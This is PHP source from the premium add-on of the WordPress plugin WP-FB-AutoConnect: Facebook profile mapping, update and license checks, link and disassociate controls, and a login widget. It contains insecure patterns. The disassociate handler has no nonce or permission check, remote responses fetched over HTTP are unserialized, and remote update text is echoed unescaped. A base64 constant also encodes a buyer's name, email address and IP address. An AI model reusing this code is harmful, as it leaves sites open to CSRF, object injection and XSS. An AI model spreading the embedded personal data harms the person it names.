    //Now that we have the info from Facebook, go through and save each one to xProfile!
    $jfb_log .= "PREMIUM: Mapping fields: ";
    foreach( $current_mappings as $xProfileField => $facebookField )
    {
        if(!$facebookField || $facebookField == "0") continue;
        if(!isset($fbuser[$facebookField])) continue;
        $jfb_log .= '"' . $xProfileField . '=>' . $facebookField . '(' . $fbuser[$facebookField] . ')"   ';
        xprofile_set_field_data($xProfileField, $args['WP_ID'], $fbuser[$facebookField]);
    }
    $jfb_log .= "\n";
}


/**
  * Some Facebook information - i.e. birthday, education, etc - requires extra permissions to get.
  * This tells the Login Button to prompt for those permissions (if required by the current XProfile settings).
  */
function jfb_xprofile_extended_permissions($arg)
{
    //If BuddyPress isn't enabled, we obviously won't be importing to XProfile
    if( !function_exists('xprofile_set_field_data') ) return $arg;
    
    //Get an array of unique fields we're fetching from Facebook
    global $opt_jfbp_xprofile_mappings;
    $current_mappings = get_option($opt_jfbp_xprofile_mappings);
    $fbFields = array_diff(array_unique($current_mappings), array("0"));

    //Make a list of the Facebook fields which require extended permissions (See: https://developers.facebook.com/docs/reference/api/user/)
    $fields_requiring_perms = array(
    			"birthday"=>"user_birthday", "gender"=>"user_gender", "link"=>"user_link",
    			'location'=>"user_location", "languages"=>"user_likes", 
    			'hometown'=>'user_hometown', 'music'=>'user_likes');
	$fields_requiring_perms = apply_filters('wpfb_xprofile_fields_requiring_perms', $fields_requiring_perms);

    //Combine the array of "fields we want" with "fields which require permissions" to get "fields we want which require permissions"
    $fbFields = array_flip($fbFields);
    $fbFields = array_intersect_key($fbFields, $fields_requiring_perms);
    if(count($fbFields) == 0) return $arg;
        
    //Finally, make a list of required permissions we'll prompt for
    foreach($fbFields as $key=>$value) $fbFields[$key] = $fields_requiring_perms[$key];
    $fbFields = array_unique($fbFields);
    $fbFields = implode(",", $fbFields);

    //And add it to the login button filter!
    if(strlen($arg)!=0) $arg .= ",";
    return $arg . $fbFields;
}


///////////////////////Check & Notify of Updates////////////////////////////
////////////////////////////////////////////////////////////////////////////


//Whenever the panel loads, check if the installed addon is older than the latest version our database knows about, and notify if so.
//Also make sure a cron job is scheduled to periodically check the latest version (and save it in the DB), and handle user requests
//to immediately check for an update.
function jfb_p_update_notice()
{
    //If the user has just requested that we check for an update manually, run it.
    //Also take that to mean that the user no longer wants to hide update notification messages.
    global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
    $manualUpdateCheckSuccessful = false;
    if( isset($_POST['VersionCheckNow']) )
    {
        if( jfb_p_cron_updatecheck_run() ) $manualUpdateCheckSuccessful = true;
        else { ?><div class="error"><p><strong><?php _e('Update check failed', 'wp-fb-autoconnect')?></strong></p></div><?php }
        update_option($opt_jfbp_hide_updatenote_till_ver, 0);
    }

	//Schedule a cronjob to check periodically for updates
	if( wp_get_schedule('jfb_p_cron_updatecheck') == false )
		wp_schedule_event(time(), 'daily', 'jfb_p_cron_updatecheck');

	//If the user elected to hide update messages up to this version, write an option to the db.
	if( isset($_REQUEST[$opt_jfbp_hide_updatenote_till_ver]) )
    {
        ?><div class="updated"><p><strong><?php _e("WP-FB-AutoConnect Premium update notifications will no longer be shown for this version.  You can re-enable them by manually clicking the 'Check for Updates' link on the Premium Options page.", 'wp-fb-autoconnect')?></strong></p></div><?php
    	update_option($opt_jfbp_hide_updatenote_till_ver, $_REQUEST[$opt_jfbp_hide_updatenote_till_ver]);
    }
    	
	//Show a notification if the installed addon version is older than the latest (and the user didn't hide them)
	$verInfo = get_option($opt_jfbp_latestversion);
    if(is_string($verInfo)) $verInfo = maybe_unserialize($verInfo);
    if(is_array($verInfo))
    {
    	if( JFB_PREMIUM_VER < $verInfo['ver'])
    	{
    		if(get_option($opt_jfbp_hide_updatenote_till_ver) < $verInfo['ver'] )
    		{
    		    ?><div class="error">
                    <form name="formHideUpdateNotification" method="post" action="">
        		    	<p>
        		    		<?php echo $verInfo['log']; ?><br />
                            <a href="javascript:document.formHideUpdateNotification.submit();"><?php _e('Hide for this version', 'wp-fb-autoconnect')?></a>
        		    	</p>
        		    	<input type="hidden" name="<?php echo $opt_jfbp_hide_updatenote_till_ver;?>" value="<?php echo $verInfo['ver']?>" />
    		    	</form>
    		    </div><?php
    		}
    	}
        else if($manualUpdateCheckSuccessful)
        {
            ?><div class="updated"><p><strong><?php echo sprintf(__('Update check successful. You already have the most up-to-date version of the Premium addon (%s).', 'wp-fb-autoconnect'), "v" . JFB_PREMIUM_VER);?></strong></p></div><?php
        }
    }
}

//Check for the latest version from my server, and save it in the database.
//This is typically called by a cronjob to check periodically, but may also be called manually.
function jfb_p_cron_updatecheck_run()
{
    //Check for updates
    global $opt_jfbp_latestversion, $jfb_version;
    $args = array( 'blocking'=>true, 'body'=>array('product'=>'WP-FB-AC-Premium', 'addon_ver'=>JFB_PREMIUM_VER, 'plugin_ver'=>$jfb_version));
    $response = wp_remote_post("http://auth.justin-klein.com/VersionCheck/", $args);
    if( !is_wp_error($response) ) update_option($opt_jfbp_latestversion, $response['body']);
    
    //Check licenses
    global $opt_jfbp_invalids;
    $args = array( 'blocking'=>true, 'body'=>array('hash'=>"7q04fj87d"));
    $response = wp_remote_post("http://auth.justin-klein.com/LicenseCheck/", $args);
    if( !is_wp_error($response) ) update_option($opt_jfbp_invalids, unserialize($response['body']));
    
    //Auth2
    global $jfb_name, $jfb_version;
    jfb_auth2($jfb_name,$jfb_version,8,"0");
    return true;
}

///Add a Facebook section to the WP & BP profiles, with optional "Link" & "Disassociate" buttons//
//////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Add a section to the WORDPRESS user profile page that shows the UID and 'Link' / 'Disassociate' buttons.
 * NOTE: "Disassociate" (which I implemented first) is handled by PHP form submission; "Link" uses a more 
 * elegant AJAX solution to write the usermeta without needing to refresh the page.
 */
function jfb_wp_addprofileoptions($user)
{
    global $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $jfb_uid_meta_name, $jfb_default_email;
    global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext;
    add_option($opt_jfbp_link_buttontext, __("Link with Facebook", 'wp-fb-autoconnect'));
    add_option($opt_jfbp_unlink_buttontext, __("Disassociate From Facebook", 'wp-fb-autoconnect'));
	$fbuid = get_user_meta($user->ID, $jfb_uid_meta_name, true);
	$userdata = wp_get_current_user();
	?>
	<table class="form-table">
		<tr>
			<th><label>Facebook</label></th>
			<?php if( !isset($fbuid) || !$fbuid ): ?>
			<td>
			    <?php if( get_option($opt_jfbp_allow_link) && $userdata->ID == $user->ID): ?>
			        <input type="button" class="button-primary" value="<?php echo get_option($opt_jfbp_link_buttontext);?>" onclick="jfb_js_link_user()" />
			    <?php else: ?>
			        <p>-</p>
			    <?php endif; ?>
			</td>
			<?php elseif(strpos($user->user_email, $jfb_default_email) !== FALSE): ?>
			<td>
				<?php echo jfb_get_fb_profilelink($user->ID)?>
				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?>(<?php _e('This user cannot be disassociated from Facebook until they have a valid e-mail address', 'wp-fb-autoconnect')?>)<?php endif; ?>
			</td>
			<?php else: ?>
			<td>
				<?php echo jfb_get_fb_profilelink($user->ID)?>
				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?><input type="button" class="button-primary" value="<?php echo get_option($opt_jfbp_unlink_buttontext)?>" onclick="jfb_disconnect_user(<?php echo $user->ID;?>)" /><?php endif; ?>
			</td>
			<?php endif; ?>
		</tr>
	</table>
<?php
}


/*
 * Add a section to the BUDDYPRESS user profile page that shows the UID and 'Link' / 'Disassociate' buttons
 */
function jfb_bp_addprofileoptions()
{
    //Only show the "Facebook" section to admins, and to users logged in and viewing their own profiles
    global $opt_jfbp_allow_disassociate, $jfb_uid_meta_name, $jfb_default_email;
    global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext;
    add_option($opt_jfbp_link_buttontext, __("Link with Facebook", 'wp-fb-autoconnect'));
    add_option($opt_jfbp_unlink_buttontext, __("Disassociate From Facebook", 'wp-fb-autoconnect'));
    if( !bp_is_my_profile() && !current_user_can('delete_users') ) return;
    ?>
    <h4>Facebook</h4>
        <table class="profile-fields">
            <tr class="field_name">
                <td class="label"><?php _e('Associated Account', 'wp-fb-autoconnect')?></td>
                <td class="data">
                    <?php
                    //If the current user is associated with a FB account, output that fbuid and a disconnect button
                    global $jfb_uid_meta_name;
                    $fbuid = get_user_meta(bp_displayed_user_id(), $jfb_uid_meta_name, true); 
                    if( $fbuid )
                    {
                        echo jfb_get_fb_profilelink(bp_displayed_user_id()) . " ";
                        if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') )
                        {
                            echo '<input type="button" class="button-primary" value="'.get_option($opt_jfbp_unlink_buttontext).'" onclick="jfb_disconnect_user('. bp_displayed_user_id() . ')" />';                      
                            jfb_profiledisconnect_form();
                        }
                    }
                    //Otherwise, a "link" button.
                    else
                    {
                        global $opt_jfbp_allow_link;
                        if(get_option($opt_jfbp_allow_link) && bp_is_my_profile())
                            echo '<input type="button" class="button-primary" value="'.get_option($opt_jfbp_link_buttontext).'" onclick="jfb_js_link_user()" />';
                        else
                            echo "-";
                    }
                    ?>
                </td>
            </tr>
        </table>
    <?php
}


/*
 * ASSOCIATE: Output a JS callback to handle "Link with Facebook" logins.  Unlike a normal login, we don't redirect to 
 * _process_login.php; instead, we use the WP AJAX API to call a function which will simply update that user's metadata
 * with the appropriate Facebook UID.  This doesn't prompt for any of the extra permissions - *just* the uid.
 * Tutorial on AJAX requests in WP: http://codex.wordpress.org/AJAX_in_Plugins
 * Better tutorial, including nonces: http://wp.smashingmagazine.com/2011/10/18/how-to-use-ajax-in-wordpress/
 */
function jfb_output_js_link_user()
{
    $userdata = wp_get_current_user();
    ?>
    <script type="text/javascript" >
        function jfb_js_link_user() 
        {            
            FB.login(function(resp)
            {
                if (resp.authResponse) jfb_js_link_callback();
            });
        }
        
        function jfb_js_link_callback()
        {
            //Make sure the user logged into Facebook (didn't click "cancel" in the login prompt)
            FB.getLoginStatus(function(response)
            {
                if (!response.authResponse)
                {
                    return;
                }
            
                //If the user completed the login, invoke the action to handle updating the usermeta 
                var data = {action: 'jfb_process_linkwithfacebook_action',
                            uid: '<?php echo $userdata->ID ?>',
                            fb_uid: response.authResponse.userID,
                            nonce: '<?php echo wp_create_nonce('jfb_process_linkwithfacebook') ?>' };
                jQuery.post('<?php echo admin_url('admin-ajax.php')?>', data, function(response)
                {
                    //alert(response);
                    if(response == 0)
                        alert("Linking failed.\n\nThis should never happen; if it does, please report it to the WP-FB-AutoConnect plugin author.")
                    else
                    {
                        //Note: I don't really have to do this - I could just update the DOM with JS, as at this point, the usermeta
                        //is written and everything is done.  I simply reload to keep the implementation consistent with the disconnect
                        //button, and for ease...
                        window.location = window.location.href;
                    }
                });
            });
        }
    </script>
    <?php
}


/*
 * ASSOCIATE: This action is invoked by AJAX to link a logged-in user with their Facebook account (by tagging their usermeta
 * with the appropriate facebook uid).  See the function above for more info.
 */
function jfb_process_linkwithfacebook() 
{
    //Nonce security check
    if ( !wp_verify_nonce( $_REQUEST['nonce'], "jfb_process_linkwithfacebook")) 
       die(0);
       
    //Sanity check
    $userdata = wp_get_current_user();
    if( $userdata->ID != intval( $_POST['uid'] ) )
        die(0);
    
    //Update usermeta & echo back the UID as confirmation
    global $jfb_uid_meta_name;
    update_user_meta($userdata->ID, $jfb_uid_meta_name, $_POST['fb_uid']);
    die($_POST['fb_uid']);
}


/**
  * DISASSOCIATE: Since the Disassociate Button on the Profile page will already be inside the main update form,
  * in order to implement a different action, clicking it uses JS to submit a different hidden form I output below.
  */
function jfb_profiledisconnect_form()
{
	?>
	<form id="wp-fb-d-fm" name="jfb_disconnect_form" method="post" action="" >
		<input type="hidden" name="jfb_disconnect_user" id="jfb_disconnect_user" value="0" />
	</form>
	<script type='text/javascript'>
	function jfb_disconnect_user(uid)
	{
		document.getElementById('jfb_disconnect_user').value = uid;
		document.jfb_disconnect_form.submit();
	}
	</script>
	<?php
}


/**
  * DISASSOCIATE: When the Disassociate button is clicked, it submits a form via JS.  Here I check for that form's
  * POST variable - if it's set, it means the Disconnect button was clicked, so we need to disconnect the user
  * by deleting WP-FB-AutoConnect's usermeta. 
  */
function jfb_profiledisconnect_process()
{
	global $jfb_uid_meta_name;
	if(isset($_POST['jfb_disconnect_user']) && $_POST['jfb_disconnect_user'])
	{
	    delete_user_meta($_POST['jfb_disconnect_user'], $jfb_uid_meta_name);
        delete_user_meta($_POST['jfb_disconnect_user'], 'facebook_avatar_thumb');
        delete_user_meta($_POST['jfb_disconnect_user'], 'facebook_avatar_full');
	    
	    /*
        //Message for BP
	    if(function_exists('bp_core_add_message')) bp_core_add_message( __("This user account has been disassociated from Facebook.",'wp-fb-autoconnect') );
        //Message for WP
		if(is_admin()): ?><div id="disconnected-message" class="updated"><strong><?php _e('This user account has been disassociated from Facebook.', 'wp-fb-autoconnect')?></strong></div><?php endif;
        */
	} 
}


/////////////////////Set role for autoregistered users//////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_set_autoregistered_role($args)
{
	//Make sure the role option is valid, and if so, assign it.
	global $jfb_log, $opt_jfbp_autoregistered_role, $wp_roles;
	if ( empty( $wp_roles->roles[get_option($opt_jfbp_autoregistered_role)] ) )
	{
		$jfb_log .= "PREMIUM: The selected role (".get_option($opt_jfbp_autoregistered_role).") is invalid!  Registering with the default role (".get_option('default_role').").\n";
		return $args;
	}
	$jfb_log .= "PREMIUM: Assigning user role '".get_option($opt_jfbp_autoregistered_role)."'\n";
	$args['role'] = get_option($opt_jfbp_autoregistered_role);
	return $args;
}


//////////////////////////////////Shortcode/////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * A shortcode handler that will allow users to add "Login with Facebook" buttons to their pages or posts.
  * The shortcode is [jfb_facebook_btn].  Default behavior is to show a login button for logged-out users,
  * and nothing for logged-in users.  Alternatively, you can use the "loggedn=''" param to specify something
  * to echo when the user is logged in, in place of the button.
  */
function jfb_facebook_btn_shortcode( $atts )
{
    extract( shortcode_atts( array(
        'loggedin' => ''
    ), $atts ) );
    
    if( !is_user_logged_in() )
    {
        ob_start();
        jfb_output_facebook_btn();
        $output_string=ob_get_contents();
        ob_end_clean();
        return $output_string;
    }
    else
        return $loggedin;
}

/**********************************************************************/
/**********************************************************************/
/**************************Premium Widget******************************/
/**********************************************************************/
/**********************************************************************/

//Premium version of the login widget, which offers some additional customizability
function register_jfbLogin_premium() { register_widget( 'Widget_AutoConnect_Premium' ); }
class Widget_AutoConnect_Premium extends WP_Widget
{
    //Init the Widget
    public function __construct()
    { 
        parent::__construct( false, "WP-FB AutoConnect Premium", array( 'description' => __('A Login/Logout widget with Facebook Connect button','wp-fb-autoconnect') ) );
    }

    //Output the widget's content.
    function widget( $args, $instance )
    {
        //Get args and output the title
        extract( $args );
        echo $before_widget;
        $title = apply_filters('widget_title', $instance['title']);
        if( $title ) echo $before_title . $title . $after_title;
        echo "\n<!--WP-FB AutoConnect Premium Widget-->\n";
        
        //For updating users who haven't re-saved their Widget options since these were added...
        if(!isset($instance['showforgot'])) $instance['showforgot'] = true;
        
        //If logged in, show "Welcome, User!"
        if( is_user_logged_in() ):
        $userdata = wp_get_current_user();
        ?>
            <?php if($instance['showavatar']): ?>
            <div class="wpfb-widget-avatar"><?php echo get_avatar($userdata->ID, $instance['avatarsize']);?></div>
            <?php endif; ?>
            <div style='text-align:center'>
              <?php 
                echo $instance['labelWelcome'] . " " . $userdata->display_name;
              ?>!<br />
              <small>
                <?php 
                if( $instance['showEditProfile'] ):
                    $profileLink = get_option('siteurl')."/wp-admin/profile.php";
                    if( $instance['bpProfileLink'] && function_exists('bp_core_get_user_domain')):
                        $profileLink = bp_core_get_user_domain($userdata->ID).'/profile';
                    endif;
                    ?><a href="<?php echo $profileLink;?>"><?php echo $instance['labelProfile']; ?></a> | <?php
                endif; ?>
                <?php if($instance['logoutofFB']): ?>
                	<a href="javascript:LogoutOfFacebook();"><?php echo $instance['labelLogout']; ?></a>
                    <script type="text/javascript">//<!--
                    function LogoutOfFacebook()
                    {
                        FB.getLoginStatus(function(response)
    					{
                        	if(response.authResponse)
                        	{
                            	if (confirm("<?php _e('Logout of Facebook too?', 'wp-fb-autoconnect')?>"))
                            	{ 
                            		FB.logout(function(response)
                                    {
                                        window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                                    });
                            	}
                            	else
                            		window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                        	}
                        	else
                        		window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                        });
                    }
                  //--></script>
                <?php else: ?>
					<a href="<?php echo wp_logout_url( $_SERVER['REQUEST_URI'] )?>"><?php echo $instance['labelLogout']; ?></a>
			    <?php endif; ?>
              </small>
            </div>
        <?php
        
        //If not logged in, show the login form:
        else:
            //Wordpress "User/Pass" fields 
            if( $instance['showwplogin'] ):
            ?>
            <form name='loginform' id='loginform' action='<?php echo wp_login_url(); ?>' method='post'>
                <label><?php echo $instance['labelUserName']; ?></label><br />
                <input type='text' name='log' id='user_login' class='input' tabindex='20' /><input type='submit' name='wp-submit' id='wp-submit' value='<?php echo $instance['labelBtn']; ?>' tabindex='23' /><br />
                <label><?php echo $instance['labelPass']; ?></label><br />
                <input type='password' name='pwd' id='user_pass' class='input' tabindex='21' />
                <span id="forgotText"><?php if( $instance['showforgot'] ): ?> <a href="<?php echo (isset($instance['forgotURL'])?$instance['forgotURL']:wp_lostpassword_url());?>" rel="nofollow" ><?php echo $instance['labelForgot']; ?></a><?php else: echo "&nbsp;"; endif; ?></span><br />
                <?php 
                if( $instance['showrememberme'] )
                    echo '<span id="rememberText"><input name="rememberme" type="checkbox" id="rememberme" value="forever" tabindex="90" /> ' . $instance['labelRemember'] . '</span>';
                ?>
                <?php if( $instance['showregister'] ) echo wp_register('<span id="registerText">','</span>'); ?>
                <input type='hidden' name='redirect_to' value='<?php echo htmlspecialchars($_SERVER['REQUEST_URI'])?>' />
            </form>
            <?php
            
            //Note that if we AREN'T showing the user/pass fields but the user DOES want a "rememberme" checkbox,
            //we'll create a "dummy" form with just that checkbox.  The value will be fetched via JS later, when
            //the user actually performs the login (see jfb_p_rememberme_frm/jfb_p_rememberme_js below).
            elseif ($instance['showrememberme']):
                echo '<input name="rememberme" type="checkbox" id="rememberme" value="forever" tabindex="90" /> ' . $instance['labelRemember'];
            endif;
            
            //Now we can output the Facebook button
            global $opt_jfb_hide_button;
            if( !get_option($opt_jfb_hide_button) )
            {
                jfb_output_facebook_btn();
            }
        endif;
        echo $after_widget;
    }

    //Update the widget settings
    function update( $new_instance, $old_instance )
    {
        $instance = $old_instance;
        $instance['title'] = $new_instance['title'];
        $instance['labelUserName'] = $new_instance['labelUserName'];
        $instance['labelPass'] = $new_instance['labelPass'];
        $instance['labelRemember'] = $new_instance['labelRemember'];
        $instance['labelForgot'] = $new_instance['labelForgot'];
        $instance['labelBtn'] = $new_instance['labelBtn'];
        $instance['labelLogout'] = $new_instance['labelLogout'];
        $instance['labelProfile'] = $new_instance['labelProfile'];
        $instance['labelWelcome'] = $new_instance['labelWelcome'];
        $instance['showwplogin'] = isset($new_instance['showwplogin'])&&$new_instance['showwplogin'] ? 1 : 0;
        $instance['showrememberme'] = isset($new_instance['showrememberme'])&&$new_instance['showrememberme'] ? 1 : 0;
        $instance['showregister'] = isset($new_instance['showregister'])&&$new_instance['showregister'] ? 1 : 0;
        $instance['showforgot'] = isset($new_instance['showforgot'])&&$new_instance['showforgot'] ? 1 : 0;
        $instance['logoutofFB'] = isset($new_instance['logoutofFB'])&&$new_instance['logoutofFB'] ? 1 : 0;
        $instance['showavatar'] = isset($new_instance['showavatar'])&&$new_instance['showavatar'] ? 1 : 0;
        $instance['showEditProfile'] = isset($new_instance['showEditProfile'])&&$new_instance['showEditProfile'] ? 1 : 0;
        $instance['bpProfileLink'] = isset($new_instance['bpProfileLink'])&&$new_instance['bpProfileLink'] ? 1 : 0;
        $instance['avatarsize'] = $new_instance['avatarsize'];
        $instance['forgotURL'] = $new_instance['forgotURL'];
        return $instance;
    }

    //Display the widget settings on the widgets admin panel
    function form( $instance )
    {
        $default = array( "title"=>"WP-FB AutoConnect",
                          "labelUserName"=>__("User",'wp-fb-autoconnect').":",
                          "labelPass"=>__("Pass",'wp-fb-autoconnect').":",
                          "labelBtn"=>__("Login",'wp-fb-autoconnect'),
                          "labelRemember"=>__("Remember",'wp-fb-autoconnect'),
                          "labelForgot"=>__("Forgot",'wp-fb-autoconnect') . "?",
                          "labelLogout"=>__("Logout",'wp-fb-autoconnect'),
                          "labelProfile"=>__("Edit Profile",'wp-fb-autoconnect'),
                          "labelWelcome"=>__("Welcome",'wp-fb-autoconnect') . ",", 
                          "showwplogin"=>true, "showrememberme"=>false, "showregister"=>true, "showforgot"=>true, "logoutofFB"=>false, "showavatar"=>false, "showEditProfile"=>true, "bpProfileLink"=>true, "avatarsize"=>35,
                          "forgotURL"=>wp_lostpassword_url());
		$instance = wp_parse_args( (array) $instance, $default );
        ?>
        <p>
            <b><?php _e('Title', 'wp-fb-autoconnect')?>:</b>
            <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $instance['title']; ?>" />
        </p>
        <p>
            <b><?php _e('Labels', 'wp-fb-autoconnect'); ?>:</b><br />
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelUserName'); ?>" name="<?php echo $this->get_field_name('labelUserName'); ?>" type="text" <?php $this->eValue($instance, 'labelUserName'); ?> /> <small><?php _e('User', 'wp-fb-autoconnect')?>:</small><br />
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelPass'); ?>" name="<?php echo $this->get_field_name('labelPass'); ?>" type="text" <?php $this->eValue($instance, 'labelPass'); ?> /> <small><?php _e('Pass', 'wp-fb-autoconnect')?>:</small><br />
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelBtn'); ?>" name="<?php echo $this->get_field_name('labelBtn'); ?>" type="text" <?php $this->eValue($instance, 'labelBtn'); ?> /> <small><?php _e('Login', 'wp-fb-autoconnect')?></small>
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelRemember'); ?>" name="<?php echo $this->get_field_name('labelRemember'); ?>" type="text" <?php $this->eValue($instance, 'labelRemember'); ?> /> <small><?php _e('Remember', 'wp-fb-autoconnect')?></small>
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelForgot'); ?>" name="<?php echo $this->get_field_name('labelForgot'); ?>" type="text" <?php $this->eValue($instance, 'labelForgot'); ?> /> <small><?php _e('Forgot', 'wp-fb-autoconnect')?>?</small>
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelLogout'); ?>" name="<?php echo $this->get_field_name('labelLogout'); ?>" type="text" <?php $this->eValue($instance, 'labelLogout'); ?> /> <small><?php _e('Logout', 'wp-fb-autoconnect')?></small>
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelProfile'); ?>" name="<?php echo $this->get_field_name('labelProfile'); ?>" type="text" <?php $this->eValue($instance, 'labelProfile'); ?> /> <small><?php _e('Edit Profile', 'wp-fb-autoconnect')?></small>
            <input <?php $this->disableatt() ?> style="width:50%;" id="<?php echo $this->get_field_id('labelWelcome'); ?>" name="<?php echo $this->get_field_name('labelWelcome'); ?>" type="text" <?php $this->eValue($instance, 'labelWelcome'); ?> /> <small><?php _e('Welcome', 'wp-fb-autoconnect')?>,</small>
        </p>
        <p>
            <b><?php _e('Other', 'wp-fb-autoconnect')?>:</b><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showwplogin'); ?> id="<?php echo $this->get_field_id( 'showwplogin' ); ?>" name="<?php echo $this->get_field_name( 'showwplogin' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showwplogin' ); ?>"><?php _e('Show WP User/Pass Login', 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showrememberme' ); ?> id="<?php echo $this->get_field_id( 'showrememberme' ); ?>" name="<?php echo $this->get_field_name( 'showrememberme' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showrememberme' ); ?>"><?php _e("Show 'Remember'", 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showregister'); ?> id="<?php echo $this->get_field_id( 'showregister' ); ?>" name="<?php echo $this->get_field_name( 'showregister' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showregister' ); ?>"><?php _e("Show 'Register'", 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showforgot' ); ?> id="<?php echo $this->get_field_id( 'showforgot' ); ?>" name="<?php echo $this->get_field_name( 'showforgot' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showforgot' ); ?>"><?php _e("Show 'Forgot?'", 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showEditProfile' ); ?> id="<?php echo $this->get_field_id( 'showEditProfile' ); ?>" name="<?php echo $this->get_field_name( 'showEditProfile' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showEditProfile' ); ?>"><?php _e("Show 'Edit Profile'", 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'logoutofFB' ); ?> id="<?php echo $this->get_field_id( 'logoutofFB' ); ?>" name="<?php echo $this->get_field_name( 'logoutofFB' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'logoutofFB' ); ?>"><?php echo __('Prompt') . ' \'' . __('Logout of Facebook too?', 'wp-fb-autoconnect') . "'";?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'bpProfileLink' ); ?> id="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>" name="<?php echo $this->get_field_name( 'bpProfileLink' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>"><?php _e("Edit profile links to BP (if available)", 'wp-fb-autoconnect')?></label><br />
            <input <?php $this->disableatt() ?> class="checkbox" type="checkbox" <?php $this->eChecked( $instance, 'showavatar' ); ?> id="<?php echo $this->get_field_id( 'showavatar' ); ?>" name="<?php echo $this->get_field_name( 'showavatar' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showavatar' ); ?>"><?php _e("Show Avatar (when logged in)", 'wp-fb-autoconnect')?></label><br />
            <?php _e('Avatar Size', 'wp-fb-autoconnect')?>: <input <?php $this->disableatt() ?> style="width:35px" id="<?php echo $this->get_field_id('avatarsize'); ?>" name="<?php echo $this->get_field_name('avatarsize'); ?>" type="text" <?php $this->eValue($instance, 'avatarsize'); ?> />px<br/>
            <?php _e('Forgot Pass URL', 'wp-fb-autoconnect')?>:<br/>
            <input <?php $this->disableatt() ?> style="width:100%" id="<?php echo $this->get_field_id('forgotURL'); ?>" name="<?php echo $this->get_field_name('forgotURL'); ?>" type="text" <?php $this->eValue($instance, 'forgotURL'); ?> />
        </p>
<?php }

    /*
     * Helpers for outputting a 'teaser' premium widget in the free plugin.
     */
    function eValue($instance, $index) { echo "value=\"" . (isset($instance[$index])?$instance[$index]:'') . "\" "; }
    function eChecked($instance, $index) { isset($instance[$index])?checked( $instance[$index], true ):checked(false, true);}
    function disableatt() { echo (get_class($this) == "Widget_AutoConnect_Premium"?"":"disabled='disabled'"); }
}


//Add a POST variable to be sent through to _process_login.php
add_action('wpfb_add_to_form', 'jfb_p_rememberme_frm');
function jfb_p_rememberme_frm(){
  echo '<input type="hidden" name="rememberme" id="fb_rememberme" value="0" />';
}

//Before the form is submitted, use JS to set the field dynamically from a textbox
add_action('wpfb_add_to_js', 'jfb_p_rememberme_js');
function jfb_p_rememberme_js(){
  echo "var rememberme = document.getElementById('rememberme');\n";
  echo "if( rememberme && rememberme.checked ) document.getElementById('fb_rememberme').value = 1;\n";
}



/**********************************************************************/
/**********************************************************************/
/***************************Special Sauce******************************/
/**********************************************************************/
/**********************************************************************/

define('JFB_PREMIUM_VALUE', 'YToxMDp7czo0OiJ1c2VyIjtpOjU1MDk7czo1OiJlbWFpbCI7czoyNzoiYWRtaW5pc3RyYXRpZUB0cmlmaXgub25saW5lIjtzOjQ6Im5hbWUiO3M6MTM6Ikxvd2llIGRlIEhhYXIiO3M6NzoidmVyc2lvbiI7czozOiIgNDIiO3M6NToib3JkZXIiO3M6NDoiODQxMyI7czo3OiJ1cGdyYWRlIjtzOjE6IjAiO3M6NzoicHJvZHVjdCI7aTo0OTtzOjU6InByaWNlIjtkOjI5Ljk4OTk5OTk5OTk5OTk5ODQzNjgwNTk4MTMyNzc3OTU5MTA4MzUyNjYxMTMyODEyNTtzOjQ6ImRhdGUiO3M6MTk6IjIwMTgtMDktMTcgMDc6MTc6MjYiO3M6MjoiSVAiO3M6MTI6IjgwLjY1LjEyNC4zNCI7fQ==');
